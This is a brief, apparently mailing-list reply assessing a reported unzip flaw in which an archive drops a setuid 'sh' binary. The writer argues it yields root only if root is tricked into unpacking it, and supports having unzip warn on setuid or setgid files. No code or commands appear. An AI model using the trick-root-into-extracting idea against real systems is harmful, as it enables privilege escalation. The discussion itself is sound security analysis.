this only works if the user un-zipping the file is already root. 
otherwise it creates an "sh" binary which is setuid to the user who 
unzipped the file. this kind of "exploit" is only useful if you can 
somehow trick root into unzipping the file- it cannot be used to gain 
root on a machine where you don't already have it.

although i will agree that having the unzip program warn the user when 
creating a setuid or setgid file is a good idea in general.
